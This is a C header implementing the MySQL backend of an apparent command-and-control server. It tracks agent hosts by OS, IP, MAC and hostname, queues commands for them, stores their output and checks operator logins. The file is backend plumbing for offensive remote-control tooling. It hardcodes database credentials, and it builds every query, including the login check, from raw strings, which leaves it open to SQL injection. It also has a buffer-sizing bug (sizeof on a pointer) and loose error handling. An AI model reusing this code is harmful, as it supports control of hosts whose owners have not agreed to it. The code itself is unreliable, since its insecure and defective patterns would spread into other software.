#ifndef database
#define database

#include <mysql/mysql.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdbool.h>
#include <cjson/cJSON.h>

#define BUFFER_SIZE 4096
#define MAX_INFO 999999999

char dbserver[256] = "localhost";
char user[32] = "core";
char pass[32] = "core";
char db[32] = "c2_database";

struct db_agents {
    char agent_id[65];
    char os[50];
    char ip[50];
    char mac[50];
    char hostname[255];
};

struct db_tasks {
    char agent_id[65];
    char command[1024];
    char response[BUFFER_SIZE];
};

struct db_logs {
    char agent_id[65];
    char log_type[16];
    char message[BUFFER_SIZE];
};


MYSQL *con;
int db_conn() {
    con = mysql_init(NULL);
    if (con == NULL) {
        fprintf(stderr, "%s\n", mysql_error(con));
        return -1;
    }
    // connect to dabatabase
    if (mysql_real_connect(con, dbserver, user, pass, db, 0, NULL, 0) == NULL) {
        fprintf(stderr, "%s\n", mysql_error(con));
        return -1;
    }
    return 0;
}

void db_close() {
    mysql_close(con);
}

int check_agent_id(char *agent_id) {
    char query[1024];
    snprintf(query, sizeof(query), "SELECT * FROM Agents WHERE agent_id = '%s'", agent_id);
    if (mysql_query(con, query)) {
        fprintf(stderr, "%s\n", mysql_error(con));
        mysql_close(con);
    }
    MYSQL_RES *result = mysql_store_result(con);
    if (result == NULL) { 
        fprintf(stderr, "%s\n", mysql_error(con));
        mysql_close(con);
        return 0;
    }
    int num_rows = mysql_num_rows(result);
    mysql_free_result(result);

    return (num_rows > 0); // 1 if agent exists, 0 if not
}


char *get_task(int task_id) {
    char query[1024];
    snprintf(query, sizeof(query), "SELECT command FROM Tasks WHERE task_id = %d;", task_id);

    if (mysql_query(con, query)) {
        fprintf(stderr, "MySQL query failed: %s\n", mysql_error(con));
        return NULL;
    }
    MYSQL_RES *result = mysql_store_result(con);
    if (result == NULL) {
        fprintf(stderr, "MySQL store result failed: %s\n", mysql_error(con));
        return NULL;
    }
    MYSQL_ROW row = mysql_fetch_row(result);
    char *cmd = NULL;
    if (row && row[0]) {
        cmd = strdup(row[0]);
    }

    mysql_free_result(result);

    return cmd;
}



void store_task_response(char *response, int task_id) { 
    char *query = malloc(sizeof(response) + 1024 );
    snprintf(query, sizeof(response) + 1024, "UPDATE Tasks SET status = TRUE, response = '%s' WHERE task_id = %d;", response, task_id);
    if (mysql_query(con, query)) {
        fprintf(stderr, "MySQL query failed: %s\n", mysql_error(con));
        return;
    }

    free(query);
}




int check_tasks_queue(char *agent_id) {
    char query[1024];
    snprintf(query, sizeof(query), "SELECT task_id, status FROM Tasks WHERE agent_id = '%s';", agent_id);

    if (mysql_query(con, query)) {
        fprintf(stderr, "Query failed: %s\n", mysql_error(con));
        return -1;
    }

    MYSQL_RES *result = mysql_store_result(con);
    if (result == NULL) {
        fprintf(stderr, "Store result failed: %s\n", mysql_error(con));
        return -1;
    }

    MYSQL_ROW row;
    while ((row = mysql_fetch_row(result))) {
        // row[0] = task_id, row[1] = status
        if (row[1] != NULL && atoi(row[1]) == 0) {
            int task_id = atoi(row[0]);
            mysql_free_result(result);
            return task_id;
        }
    }

    mysql_free_result(result);
    return -1; 
}





void AgentsTable(struct db_agents args) {
    char *query = malloc(256+sizeof(struct db_agents));
    snprintf(query,  256 + sizeof(struct db_agents), "INSERT INTO Agents (agent_id, os, ip, mac, hostname) VALUES ('%s', '%s', '%s', '%s', '%s');", args.agent_id, args.os, args.ip , args.mac, args.hostname);
    if (mysql_query(con, query)) {
        fprintf(stderr, "%s\n", mysql_error(con));
    }
    free(query);
}

void update_last_seen(char *agent_id) {
    char query[1024];
    snprintf(query, sizeof(query), "UPDATE Agents SET last_seen = CURRENT_TIMESTAMP() WHERE agent_id = '%s';", agent_id);
    if (mysql_query(con, query)) {
        fprintf(stderr, "%s\n", mysql_error(con));
    }
}

void TasksTable(struct db_tasks args) {
    char *query = malloc(256 + sizeof(struct db_tasks));
    snprintf(query,256 + sizeof(struct db_tasks), "INSERT INTO Tasks (agent_id, command, response) VALUES ('%s', '%s', '%s');", args.agent_id, args.command, args.response);
    if (mysql_query(con, query)) {
        fprintf(stderr, "%s\n", mysql_error(con));
        
    }
    free(query);
}


void LogsTable(struct db_logs args) {
    char *query= malloc(1024+sizeof(struct db_logs));
    snprintf(query, 1024+sizeof(struct db_logs),"INSERT INTO Logs (agent_id, log_type, message) VALUES ('%s', '%s', '%s');", args.agent_id, args.log_type, args.message);
    if (mysql_query(con, query)) {
        fprintf(stderr, "%s\n", mysql_error(con));
    }
    free(query);
}


// used to view agent and tasks 
char *info_view(char *table) {
    char *query = malloc(1024);
    snprintf(query, 1024, "SELECT * FROM %s;", table);
    if (mysql_query(con, query)) {
        fprintf(stderr, "%s\n", mysql_error(con));
    }


    MYSQL_RES *result = mysql_store_result(con);
    if (result == NULL) { 
        fprintf(stderr, "%s\n", mysql_error(con));
    }
    //int num_rows = mysql_num_rows(result);
    int num_fields = mysql_num_fields(result); // columns

    MYSQL_FIELD *fields = mysql_fetch_fields(result);

    cJSON *column_arrays[num_fields];
    for (int i = 0; i < num_fields; i++)
        column_arrays[i] = cJSON_CreateArray();

    MYSQL_ROW row;
    while ((row = mysql_fetch_row(result))) {
        for (int i = 0; i < num_fields; i++) {
            if (row[i])
                cJSON_AddItemToArray(column_arrays[i], cJSON_CreateString(row[i]));
            else
                cJSON_AddItemToArray(column_arrays[i], cJSON_CreateNull());
        }
    }

    // Create root object and attach columns
    cJSON *root = cJSON_CreateObject();
    for (int i = 0; i < num_fields; i++)
        cJSON_AddItemToObject(root, fields[i].name, column_arrays[i]);

    char *json_output = cJSON_Print(root);
    if (json_output) {
    } else {
        fprintf(stderr, "Failed to print JSON\n");
    }

    cJSON_Delete(root); // Automatically frees column_arrays
    mysql_free_result(result);
    free(query);

    return json_output;
}


int authenticate_operator(char *username, char*password) {
    char *query = malloc(2048);
    snprintf(query, 2048, "SELECT * FROM Operators WHERE username='%s' AND password='%s';", username, password);

    if (mysql_query(con, query)) {
        fprintf(stderr, "MySQL query error: %s\n", mysql_error(con));
        return -1;
    }

    MYSQL_RES *result = mysql_store_result(con);
    if (result == NULL) { 
        fprintf(stderr, "MySQL store result error: %s\n", mysql_error(con));
        return -1;
    }

    int num_rows = mysql_num_rows(result);
    mysql_free_result(result);

    if (num_rows > 0) {
        return 0;  // authenticated
    }

    return -1;  // not authenticated
}


char *tasks_per_agent(char *agent_id) {
    char *query = malloc(1024);
    snprintf(query, 1024, "SELECT task_id, command, response, status FROM Tasks WHERE agent_id = '%s';", agent_id);
    if (mysql_query(con, query)) {
        fprintf(stderr, "%s\n", mysql_error(con));
    }
    MYSQL_RES *result = mysql_store_result(con);
    if (result == NULL) { 
        fprintf(stderr, "%s\n", mysql_error(con));
    }
    //int num_rows = mysql_num_rows(result);
    int num_fields = mysql_num_fields(result); // columns
    MYSQL_FIELD *fields = mysql_fetch_fields(result);

    cJSON *column_arrays[num_fields];
    for (int i = 0; i < num_fields; i++)
        column_arrays[i] = cJSON_CreateArray();

    MYSQL_ROW row;
    while ((row = mysql_fetch_row(result))) {
        for (int i = 0; i < num_fields; i++) {
            if (row[i])
                cJSON_AddItemToArray(column_arrays[i], cJSON_CreateString(row[i]));
            else
                cJSON_AddItemToArray(column_arrays[i], cJSON_CreateNull());
        }
    }

    // Create root object and attach columns
    cJSON *root = cJSON_CreateObject();
    for (int i = 0; i < num_fields; i++)
        cJSON_AddItemToObject(root, fields[i].name, column_arrays[i]);

    char *json_output = cJSON_Print(root);
    if (json_output) {
    } else {
        fprintf(stderr, "Failed to print JSON\n");
    }

    cJSON_Delete(root); // Automatically frees column_arrays
    mysql_free_result(result);
    free(query);

    return json_output;   
}

void new_tasks(char *agent_id, char *command) {
    char *query = malloc(1024);
    snprintf(query, 1024, "INSERT INTO Tasks (agent_id, command) VALUES ('%s', '%s');", agent_id, command);
    if (mysql_query(con, query)) {
        fprintf(stderr, "%s\n", mysql_error(con));
    }
    free(query);
}

#endif